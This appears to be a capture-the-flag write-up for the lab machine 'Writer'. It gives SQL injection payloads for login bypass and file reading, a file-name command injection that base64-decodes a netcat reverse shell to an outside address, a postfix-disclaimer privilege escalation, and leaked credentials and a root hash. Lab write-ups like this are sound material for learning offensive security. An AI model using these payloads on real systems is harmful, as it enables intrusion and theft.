Trying SQL-injection:

Directory scan

```java
=========================================

 ========================================= 

	Sharename       Type      Comment

	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Because the SQL Injection bypass login page, we can try a boolean condition to discover admin password in burp suite: 

![Untitled](Writer/Untitled%202.png)

![Untitled](Writer/Untitled%203.png)

```java
1'+or+exists(SELECT+1+FROM+users+where+username+%3d+'admin'+and+password+like+'ยงaยง%'+limit+1)--+x
118e48794631a9612484ca8b55f622d0
118e48794631a9612484ca8b55f622d0
```

Defining number of columns in database:

```java
sid' UNION ALL SELECT 1,2,3,4,5,6;
```

Analyzing the requests we can known that in Welcome message, it shows welcome 1 when we send 0 to 5 and two when we send 1 to 6.

![Untitled](Writer/Untitled%204.png)

It shows writer.wsgi and this file have information about python. This is a interface between application server to make a connection with python django. 

Database version:

![Untitled](Writer/Untitled%205.png)

![Untitled](Writer/Untitled%206.png)

This file import the __ init __ .py from web folder. 

![Untitled](Writer/Untitled%207.png)

```java
/var/www/writer.htb/writer/__init__.py
Db credential: admin | ToughPasswordToCrack&
```

Let's to analyze that file to search for interesting things:

![Untitled](Writer/Untitled%208.png)

![Untitled](Writer/Untitled%209.png)

In this way we can create a reverse-shell without spaces.

![Untitled](Writer/Untitled%2010.png)

```java
a.jpg&&echo${IFS}bmMgMTAuMTAuMTQuNDIgMTIzNA==|base64${IFS}-d|bash;.jpg
# Using hex format
X=$'cat\x20/etc/passwd'&&$X

exploit.jpg;bmMgMTAuMTAuMTQuNDIgMTIzNA==|base64$(foo)-d|bash
a.jpg&&echo${IFS}bmMgMTAuMTAuMTQuNDIgMTIzNA==|base64${IFS}-d|bash;.jpg
```

The files are saved with random name like: 

![Untitled](Writer/Untitled%2011.png)

Dumping files from the machine:

![Untitled](Writer/Untitled%2012.png)

```java
uname='UNION ALL SELECT 1,LOAD_FILE('/var/www/writer.htb/writer/templates/settings.html'),3,4,5,6-- X&password=%27or+1%3D1--+x
```

![Untitled](Writer/Untitled%2013.png)

**Tables**

site, stories, user

**User**

Columns:

```python
uname='union all select 1,COLUMN_NAME,3,4,5,6 from information_schema.columns where table_name='users'-- x&password=1
#Output id,username,password,email,status,date_created
```

**Stories**

Columns:

```python
id,author,title,tagline,content,status,date,image
```

**Site**

Columns:

```python
id,title,description,logo,favicon,ganalytics
```

### Code review

This review will be made separated with sections, each section contains a image and the review of the block:

![Untitled](Writer/Untitled%2014.png)

The flask app sends the SQL query to the HTML page render stories. 

![Untitled](Writer/Untitled%2015.png)

After read the code many times, i didn't find the vulnerability, so i craft the local website to try decode executions:

![Untitled](Writer/Untitled%2016.png)

The idea was enter in each statement  and set a print, so with this we can debug what occurs in the application:

![Untitled](Writer/Untitled%2017.png)

So when send a simple image this shows that we are in first statement without se a image_url

![Untitled](Writer/Untitled%2018.png)

Into the exception camp, so we have to set.jpg in hellohelo phrase.

![Untitled](Writer/Untitled%2019.png)

Find a way to exit of this exception:

![Untitled](Writer/Untitled%2020.png)

I known that this file_name has to be a external url.

![Untitled](Writer/Untitled%2021.png)

So the image variable is all of the things into the file data url:

![Untitled](Writer/Untitled%2022.png)

Uploading the malicious file with the payload:

![Untitled](Writer/Untitled%2023.png)

Now in the image_url as you know, we will call the malicious file and execute the reverse shell. 

After many tries, I knew that you must have to send the payload in both parameters.

![Untitled](Writer/Untitled%2024.png)

Database credentials.

![Untitled](Writer/Untitled%2025.png)

In the folder of writer v2 has a settings file with credentials.

![Untitled](Writer/Untitled%2026.png)

And a path of the configuration file.

![Untitled](Writer/Untitled%2027.png)

Reading this file, it has database credentials. 

![Untitled](Writer/Untitled%2028.png)

Get the password in database and crack it.

Based on the groups we search to files with permissions.

![Untitled](Writer/Untitled%2029.png)

Editing the disclaimer with a reverse shell inside it.

![Untitled](Writer/Untitled%2030.png)

![Untitled](Writer/Untitled%2031.png)

Open ports:

![Untitled](Writer/Untitled%2032.png)

The port 25 is the port of email postfix

When you perform the mail, the disclaimer is executed.

![Untitled](Writer/Untitled%2033.png)

Now in the apt.conf.d we will write a persistent script.

Reverse shell

![Untitled](Writer/Untitled%2034.png)

After that we get the root access

![Untitled](Writer/Untitled%2035.png)

```python
root:$6$gev1Op0YfgboE7iR$iMNbP.8qic/SzTr4atxwLbkI7nScyZWJPbTgoXAlEz5Hcw3Ntget9j3p.iccPcw5Jl4dj4bHWZ5LvoLLNC8iB.:18816:0:99999:7:::
